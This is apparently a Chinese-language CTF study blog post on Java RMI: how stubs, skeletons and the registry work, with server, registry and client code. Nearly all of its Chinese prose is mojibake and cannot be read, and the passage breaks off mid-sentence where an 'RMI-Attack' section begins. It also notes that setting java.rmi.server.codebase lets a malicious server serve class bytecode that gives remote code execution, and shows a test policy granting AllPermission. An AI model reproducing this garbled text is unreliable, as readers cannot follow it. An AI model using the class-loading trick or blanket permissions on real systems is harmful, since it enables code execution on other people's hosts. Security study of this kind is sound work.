    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¦–å…ˆäº†è§£ä¸€ä¸‹å•¥æ˜¯RMIã€‚</p><p><code>RMIï¼šRemote Method Invocation</code> è¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">RMIä¸ºåº”ç”¨æä¾›äº†è¿œç¨‹è°ƒç”¨çš„æ¥å£ï¼ˆJavaçš„RPCæ¡†æ¶ï¼‰<br>è°ƒç”¨è¿œç¨‹ä½ç½®å¯¹è±¡çš„æ–¹æ³•<br>å®ç°RMIçš„åè®®å«JRMP<br>RMIå®ç°è¿‡ç¨‹å­˜åœ¨Javaå¯¹è±¡çš„ä¼ é€’ï¼Œå› æ­¤æ¶‰åŠåˆ°ååºåˆ—åŒ–<br></code></pre></td></tr></table></figure><p>åŸºæœ¬ä¸Šä»javaååºåˆ—åŒ–å–ç»å‡ºæ¥ï¼Œé‡åˆ°ä¸”ç»•ä¸å¼€çš„åº”è¯¥æ˜¯å„ä¸ªCCé“¾ï¼Œè€Œä¸”å¾ˆå¤šçš„javaååºåˆ—åŒ–éå¸¸å…·æœ‰ç¼åˆæ€ªçš„é£æ ¼ï¼Œåœ¨å‰æœŸå­¦ä¸šå‹åŠ›ä¸‹æ²¡åŠæ³•ç³»ç»Ÿå½’çº³ï¼ŒçŸ¥è¯†ä¹Ÿé›¶é›¶æ•£æ•£ï¼Œè¿™é‡Œå°±åšä¸€ä¸ªç³»ç»ŸåŒ–çš„å¤ç›˜ã€‚</p><p>ä½†æ˜¯CCé“¾å¤ªå…·æœ‰ä»£è¡¨æ€§äº†ï¼Œæ‰€ä»¥æˆ‘æƒ³å…ˆå†™å†™æˆ‘ç¬¬ä¸€æ¬¡æ‰“åˆ°javaé¢˜çš„æ—¶å€™é‡åˆ°çš„RMI&#x2F;JNDIé—®é¢˜ï¼Œå°±æ˜¯NCTF2023çš„loggingç­¾åˆ°é¢˜ï¼Œé‚£é“log4jè™½ç„¶å¾ˆç®€å•åœ°æ‰“acceptå¤´å°±èƒ½RCEï¼Œä½†æ˜¯èµ·çš„å·¥å…·ä¹Ÿå°±æ˜¯JNDIæ³¨å…¥çš„å·¥å…·ï¼Œæ‰€ä»¥è®©æˆ‘è®°å¿†çŠ¹æ–°ã€‚</p><p>ç„¶è€Œå…‰é å·¥å…·å°å­å½“ç„¶æ˜¯ä¸èƒ½è§£å†³é—®é¢˜çš„ï¼Œå¤§å¤šæ˜¯çš„EXPéƒ½æ˜¯ç°åœºåŠ¨è°ƒè€Œæ‰‹å¯¼æ‰‹å†™ï¼Œè€Œä¸”çº¿ä¸‹æ–­ç½‘ç¯å¢ƒæ³¨å®šä¸èƒ½åå¼¹shellè€Œåˆ™å¿…é¡»ä½¿ç”¨å†…å­˜é©¬ä¹Ÿä½¿å¾—javaåœ¨webé¢˜å†…æœ€å°‘è§£çš„æƒ…å†µï¼Œå›½èµ›ä¹Ÿé‡åˆ°äº†è§¦ç›®æƒŠå¿ƒçš„é›¶è§£ã€‚åå°„å’Œç±»åŠ è½½æˆ‘å°±ä¸å†èµ˜è¿°ï¼Œå› ä¸ºè¿™ç®—æ˜¯æœ€åŸºæœ¬çš„javaååºåˆ—åŒ–å…¥é—¨çŸ¥è¯†ã€‚</p><p>ä¸ºå±è”½ç½‘ç»œé€šä¿¡çš„å¤æ‚æ€§ï¼ŒRMIå¼•å…¥ä¸¤ä¸ªæ¦‚å¿µï¼Œå®¢æˆ·ç«¯å­˜æ ¹Stubå’ŒæœåŠ¡ç«¯éª¨æ¶Skeleton</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">å½“<span class="hljs-variable">Client</span>è¯•å›¾è°ƒç”¨ä¸€ä¸ªè¿œç«¯çš„<span class="hljs-variable">Object</span>ï¼Œå®é™…è°ƒç”¨çš„æ˜¯å®¢æˆ·ç«¯æœ¬åœ°çš„ä¸€ä¸ªä»£ç†ç±»ï¼ˆå°±æ˜¯<span class="hljs-built_in">Stub</span>ï¼‰<br><br>è°ƒç”¨<span class="hljs-variable">Server</span>çš„ç›®æ ‡ç±»ä¹‹å‰ï¼Œä¼šç»è¿‡ä¸€ä¸ªè¿œç«¯ä»£ç†ç±»ï¼ˆå°±æ˜¯<span class="hljs-built_in">Skeleton</span>ï¼‰ï¼Œå®ƒä»<span class="hljs-built_in">Stub</span>æ¥æ”¶è¿œç¨‹æ–¹æ³•è°ƒç”¨å¹¶ä¼ é€’ç»™çœŸæ­£çš„ç›®æ ‡ç±»<br><br><span class="hljs-built_in">Stub</span>å’Œ<span class="hljs-built_in">Skeleton</span>çš„è°ƒç”¨å¯¹äº<span class="hljs-variable">RMI</span>æœåŠ¡çš„ä½¿ç”¨è€…æ˜¯éšè—çš„<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/1.png" alt="1"></p><p><img src="/2024/07/18/RMI-JNDI/2.png" alt="2"></p><p><strong>ä»£ç è§„åˆ™</strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½éœ€å®šä¹‰ç”¨äºè¿œç¨‹è°ƒç”¨çš„æ¥å£<br><br>æ¥å£å¿…é¡»ç»§æ‰¿`java.rmi.Remote`æ¥å£<br><br>æ¥å£ä¸­çš„æ–¹æ³•éƒ½è¦æŠ›å‡º`java.rmi.RemoteException`å¼‚å¸¸<br><br>æœåŠ¡ç«¯åˆ›å»ºæ¥å£å®ç°ç±»ï¼Œå®ç°æ¥å£å®šä¹‰çš„æ–¹æ³•<br><br>å®ç°ç±»ç»§æ‰¿`java.rmi.server.UnicastRemoteObject`<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ±‚å®ç°ç±»ç»§æ‰¿<code>UnicastRemoteObject</code>ï¼Œæ–¹ä¾¿è‡ªåŠ¨å°†è¿™ä¸ªè¿œç¨‹å¯¹è±¡å¯¼å‡ºä¾›å®¢æˆ·ç«¯è°ƒç”¨</p><p>å½“ç„¶ä¸ç»§æ‰¿ä¹Ÿè¡Œï¼Œä½†åé¢å¾—æ‰‹åŠ¨è°ƒç”¨<code>UnicastRemoteObject#exportObject</code>ï¼Œå¯¼å‡ºå¯¹è±¡æ—¶å¯ä»¥æŒ‡å®šç›‘å¬ç«¯å£æ¥æ¥æ”¶<code>incoming calls</code>ï¼Œé»˜è®¤ä¸ºéšæœºç«¯å£ã€‚ç”±ä¸Šå›¾å¯çŸ¥è¿œç¨‹å¯¹è±¡ä¼šè¢«æ³¨å†Œåˆ°<code>RMI Registry</code>ä¸­ï¼Œæ‰€ä»¥å®é™…ä¸Šä¸éœ€è¦é€šè¿‡æ³¨å†Œä¸­å¿ƒï¼Œåªè¦æˆ‘ä»¬çŸ¥é“å¯¼å‡ºçš„è¿œç¨‹å¯¹è±¡ç›‘å¬çš„ç«¯å£å·ï¼Œä¹Ÿå¯ä»¥å’Œå®ƒç›´æ¥é€šä¿¡ã€‚</p><p><code>RMI Registry</code>æ³¨å†Œä¸­å¿ƒå­˜å‚¨ç€è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼ˆReferenceï¼‰å’Œå…¶ç»‘å®šçš„åç§°ï¼ˆNameï¼‰ï¼Œå®¢æˆ·ç«¯é€šè¿‡åç§°æ‰¾åˆ°è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼ˆReferenceï¼‰ï¼Œå†ç”±è¿™ä¸ªå¼•ç”¨å°±å¯ä»¥è°ƒç”¨åˆ°è¿œç¨‹å¯¹è±¡äº†ã€‚</p><h2 id="æ­¥éª¤ä»£ç "><a href="#æ­¥éª¤ä»£ç " class="headerlink" title="æ­¥éª¤ä»£ç "></a>æ­¥éª¤ä»£ç </h2><p><strong>Server</strong></p><p>éœ€è¦è¿œç¨‹è°ƒç”¨çš„æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥å£å®ç°ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteInterface</span> &#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello My Friend&quot;</span>;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> name.getClass().getName();<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bye&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>LocateRegistry#createRegistry()</code> æ–¹æ³•æ¥åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Registry</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>System.out.println(<span class="hljs-string">&quot;Server Start&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°†å¾…è°ƒç”¨çš„ç±»è¿›è¡Œç»‘å®šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteServer</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;<br><span class="hljs-comment">// åˆ›å»ºè¿œç¨‹å¯¹è±¡</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br><span class="hljs-comment">// ç»‘å®š</span><br>Naming.bind(<span class="hljs-string">&quot;rmi://localhost:1099/Hello&quot;</span>, remoteObject);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥æ•´åˆåˆ°Serverå¤„æ³¨å†Œè¿œç¨‹å¯¹è±¡ï¼Œä½¿ç”¨<code>LocateRegistry#createRegistry()</code>æ¥åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼Œ<code>Registry#bind()</code>è¿›è¡Œç»‘å®šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, remoteObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Naming æä¾›äº†æŸ¥è¯¢ï¼ˆlookupï¼‰ã€ç»‘å®šï¼ˆbindï¼‰ã€é‡æ–°ç»‘å®šï¼ˆrebindï¼‰ã€æ¥è§¦ç»‘å®šï¼ˆunbindï¼‰ã€listï¼ˆåˆ—è¡¨ï¼‰ç”¨æ¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒNaming æ˜¯ä¸€ä¸ªç”¨æ¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œçš„ç±»ã€‚è€Œè¿™äº›æ–¹æ³•çš„å…·ä½“å®ç°ï¼Œå…¶å®æ˜¯è°ƒç”¨ <code>LocateRegistry.getRegistry</code> æ–¹æ³•è·å–äº† Registry æ¥å£çš„å®ç°ç±»ï¼Œå¹¶è°ƒç”¨å…¶ç›¸å…³æ–¹æ³•è¿›è¡Œå®ç°çš„ã€‚</p><p>è¿™äº›æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ¥æ”¶ä¸€ä¸ªURLå­—ç¬¦ä¸²ï¼Œ<code>rmi://host:port/name</code>ï¼Œè¡¨ç¤ºæ³¨å†Œä¸­å¿ƒæ‰€åœ¨ä¸»æœºå’Œç«¯å£ï¼Œè¿œç¨‹å¯¹è±¡å¼•ç”¨çš„åç§°ã€‚</p><p>ä¸€èˆ¬æ³¨å†Œä¸­å¿ƒå’ŒæœåŠ¡ç«¯éƒ½åœ¨åŒä¸€ä¸»æœºã€‚</p><p><strong>Client</strong></p><p>å®¢æˆ·ç«¯ä¹Ÿéœ€è¦å®šä¹‰å’ŒæœåŠ¡ç«¯ç›¸åŒçš„è¿œç¨‹æ¥å£ï¼Œç„¶åè¿›è¡Œè°ƒç”¨ï¼š</p><p><code>LocateRegistry#getRegistry()</code>è¿æ¥æ³¨å†Œä¸­å¿ƒï¼Œ<code>Registry#lookup()</code>è·å–è¿œç¨‹å¯¹è±¡çš„å­˜æ ¹ï¼Œé€šè¿‡åç§°æŸ¥æ‰¾ã€‚æ³¨å†Œä¸­å¿ƒé»˜è®¤ç«¯å£1099</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br><span class="hljs-comment">// sun.rmi.registry.RegistryImpl_Stub</span><br><span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>System.out.println(Arrays.toString(registry.list()));<br><span class="hljs-comment">// lookup and call</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (RemoteInterface) registry.lookup(<span class="hljs-string">&quot;Hello&quot;</span>);<br>System.out.println(stub.sayHello());<br>System.out.println(stub.sayGoodbye());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ RemoteInterface æ¥å£åœ¨ Client&#x2F;Server&#x2F;Registry å‡åº”è¯¥å­˜åœ¨ï¼Œåªä¸è¿‡é€šå¸¸ Registry ä¸ Server é€šå¸¸åœ¨åŒä¸€ç«¯ä¸Šã€‚</p><p>RMIæ”¯æŒåŠ¨æ€ç±»åŠ è½½æ¥è¿›è¡Œååºåˆ—åŒ–ã€‚ä¸Šé¢çš„è¿œç¨‹æ–¹æ³•è°ƒç”¨æ¶‰åŠæ–¹æ³•å‚æ•°çš„ä¼ é€’ï¼Œè‹¥å®¢æˆ·ç«¯ä¼ é€’äº†ä¸€ä¸ªæœåŠ¡ç«¯ä¸å­˜åœ¨çš„ç±»å¯¹è±¡ï¼ŒæœåŠ¡ç«¯å¦‚ä½•è¿›è¡Œååºåˆ—åŒ–å‘¢ï¼Ÿ</p><p>æœ€åè¿˜æœ‰ä¸ªå°trickï¼Œé¦–å…ˆæ˜¯åŠ¨æ€ç±»åŠ è½½ï¼Œå¦‚æœå®¢æˆ·ç«¯åœ¨è°ƒç”¨æ—¶ï¼Œä¼ é€’äº†ä¸€ä¸ªå¯åºåˆ—åŒ–å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡åœ¨æœåŠ¡ç«¯ä¸å­˜åœ¨ï¼Œåˆ™åœ¨æœåŠ¡ç«¯ä¼šæŠ›å‡º ClassNotFound çš„å¼‚å¸¸ï¼Œä½†æ˜¯ RMI æ”¯æŒåŠ¨æ€ç±»åŠ è½½ï¼Œè‹¥è®¾ç½®äº†<code>java.rmi.server.codebase</code>ï¼Œåˆ™æœåŠ¡ç«¯ä¼šå°è¯•ä»å…¶åœ°å€è·å– <code>.class</code> å¹¶åŠ è½½åŠååºåˆ—åŒ–ã€‚åŠ è½½å­—èŠ‚ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.setProperty(<span class="hljs-string">&quot;java.rmi.server.codebase&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>æ‰€ä»¥ï¼Œæ‰“ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œæ¶æ„Serverç«¯å¯ä»¥å¦‚æ­¤å­˜æ”¾æ¶æ„classå­—èŠ‚ç ï¼Œè®©Clientæ¥è°ƒç”¨ä»è€ŒRCEã€‚</strong></p><p>å¯ä½¿ç”¨ <code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:9999/&quot;);</code> è¿›è¡Œè®¾ç½®ï¼Œæˆ–ä½¿ç”¨å¯åŠ¨å‚æ•° <code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot;</code> è¿›è¡ŒæŒ‡å®šã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å®‰å…¨ç­–ç•¥çš„è®¾ç½®ï¼Œå› ä¸ºæˆ‘ä»¬é€šè¿‡ç½‘ç»œåŠ è½½å¤–éƒ¨ç±»å¹¶æ‰§è¡Œæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»è¦æœ‰ä¸€ä¸ªå®‰å…¨ç®¡ç†å™¨æ¥è¿›è¡Œç®¡ç†ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®å®‰å…¨ç®¡ç†ï¼Œåˆ™ RMI ä¸ä¼šåŠ¨æ€åŠ è½½ä»»ä½•ç±»ï¼Œé€šå¸¸æˆ‘ä»¬ä½¿ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>) &#123;<br>    System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RMISecurityManager</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®¡ç†å™¨åº”ä¸ç®¡ç†ç­–ç•¥ç›¸è¾…ç›¸æˆï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æä¾›ä¸€ä¸ªç­–ç•¥æ–‡ä»¶ï¼Œé‡Œé¢é…ç½®å…è®¸é‚£äº›ä¸»æœºè¿›è¡Œå“ªäº›æ“ä½œï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿æµ‹è¯•ï¼Œç›´æ¥è®¾ç½®å…¨éƒ¨æƒé™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">grant &#123;<br>    permission java.security.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥ä½¿ç”¨ <code>-Djava.security.policy=rmi.policy</code> æˆ– <code>System.setProperty(&quot;java.security.policy&quot;, RemoteServer.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());</code> æ¥è¿›è¡Œè®¾ç½®ã€‚</p><h2 id="RMIåº•å±‚åŸç†æ€»ç»“"><a href="#RMIåº•å±‚åŸç†æ€»ç»“" class="headerlink" title="RMIåº•å±‚åŸç†æ€»ç»“"></a>RMIåº•å±‚åŸç†æ€»ç»“</h2><p>å¯¹äºæ›´åº•å±‚éƒ¨åˆ†çš„åˆ†ææˆ‘å°±ä¸çŒ®ä¸‘ï¼Œç½‘ä¸Šå¾ˆå¤šå¤§ç‰›éƒ½å†™å¾—å¾ˆé€å½»æ¸…æ™°ï¼Œè¿™é‡Œæˆ‘å°±åªå†™å†™RMI-Attackè¡Œä¸ºäº†ã€‚</p><p>åº•å±‚åŸç†å¯ä»¥æ€»ç»“ä¸ºï¼ˆå€Ÿç”¨su18ä½¬çš„å›¾å›¾ï¼‰ï¼š</p><p><img src="/2024/07/18/RMI-JNDI/3.png" alt="3"></p><p>æ€»è€Œè¨€ä¹‹ï¼ŒRMI åº•å±‚é€šè®¯é‡‡ç”¨äº†Stub (è¿è¡Œåœ¨å®¢æˆ·ç«¯) å’Œ Skeleton (è¿è¡Œåœ¨æœåŠ¡ç«¯) æœºåˆ¶ï¼ŒRMI è°ƒç”¨è¿œç¨‹æ–¹æ³•çš„å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>ã€RMI å®¢æˆ·ç«¯åœ¨è°ƒç”¨è¿œç¨‹æ–¹æ³•æ—¶ä¼šå…ˆåˆ›å»º Stub ( sun.rmi.registry.RegistryImpl_Stub )ã€‚<br><span class="hljs-number">2</span>ã€Stub ä¼šå°† Remote å¯¹è±¡ä¼ é€’ç»™è¿œç¨‹å¼•ç”¨å±‚ ( java.rmi.server.RemoteRef ) å¹¶åˆ›å»º java.rmi.server.RemoteCall( è¿œç¨‹è°ƒç”¨ )å¯¹è±¡ã€‚<br><span class="hljs-number">3</span>ã€RemoteCall åºåˆ—åŒ– RMI æœåŠ¡åç§°ã€Remote å¯¹è±¡ã€‚<br><span class="hljs-number">4</span>ã€RMI å®¢æˆ·ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚ä¼ è¾“ RemoteCall åºåˆ—åŒ–åçš„è¯·æ±‚ä¿¡æ¯é€šè¿‡ Socket è¿æ¥çš„æ–¹å¼ä¼ è¾“åˆ° RMI æœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚ã€‚<br><span class="hljs-number">5</span>ã€RMIæœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚( sun.rmi.server.UnicastServerRef )æ”¶åˆ°è¯·æ±‚ä¼šè¯·æ±‚ä¼ é€’ç»™ Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )ã€‚<br><span class="hljs-number">6</span>ã€Skeleton è°ƒç”¨ RemoteCall ååºåˆ—åŒ– RMI å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„åºåˆ—åŒ–ã€‚<br><span class="hljs-number">7</span>ã€Skeleton å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼šbindã€listã€lookupã€rebindã€unbindï¼Œå¦‚æœæ˜¯ lookup åˆ™æŸ¥æ‰¾ RMI æœåŠ¡åç»‘å®šçš„æ¥å£å¯¹è±¡ï¼Œåºåˆ—åŒ–è¯¥å¯¹è±¡å¹¶é€šè¿‡ RemoteCall ä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚<br><span class="hljs-number">9</span>ã€RMI å®¢æˆ·ç«¯ååºåˆ—åŒ–æœåŠ¡ç«¯ç»“æœï¼Œè·å–è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚<br><span class="hljs-number">10</span>ã€RMI å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼ŒRMIæœåŠ¡ç«¯åå°„è°ƒç”¨RMIæœåŠ¡å®ç°ç±»çš„å¯¹åº”æ–¹æ³•å¹¶åºåˆ—åŒ–æ‰§è¡Œç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚<br><span class="hljs-number">11</span>ã€RMI å®¢æˆ·ç«¯ååºåˆ—åŒ– RMI è¿œç¨‹æ–¹æ³•è°ƒç”¨ç»“æœã€‚<br></code></pre></td></tr></table></figure><h2 id="RMI-Attack"><a href="#RMI-Attack" class="headerlink" title="RMI-Attack"></a>RMI-Attack</h2><p>è¿™é‡Œæˆ‘è§‰å¾—su18ä½¬çš„ç”µè¯æœ¬æ¯”å–»å¾ˆæ°å½“ä¹Ÿå¾ˆæ˜“æ‡‚ï¼ŒJava RMI è®¾è®¡äº†ä¸€ä¸ª Registry çš„æ€æƒ³ï¼Œå¾ˆå¥½ç†è§£ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ³¨å†Œè¡¨æ¥æŸ¥æ‰¾ä¸€ä¸ªè¿œç«¯å¯¹è±¡çš„å¼•ç”¨ï¼Œæ›´é€šä¿—çš„æ¥è®²ï¼Œè¿™ä¸ªå°±æ˜¯ä¸€ä¸ª RMI ç”µè¯æœ¬ã€‚</p><p>æˆ‘ä»¬æƒ³åœ¨æŸä¸ªäººé‚£é‡Œè·å–ä¿¡æ¯æ—¶ï¼ˆRemote Method Invocationï¼‰ï¼Œæˆ‘ä»¬åœ¨ç”µè¯æœ¬ä¸Šï¼ˆRegistryï¼‰é€šè¿‡è¿™ä¸ªäººçš„åç§° ï¼ˆNameï¼‰æ¥æ‰¾åˆ°è¿™ä¸ªäººçš„ç”µè¯å·ç ï¼ˆReferenceï¼‰ï¼Œå¹¶é€šè¿‡è¿™ä¸ªå·ç 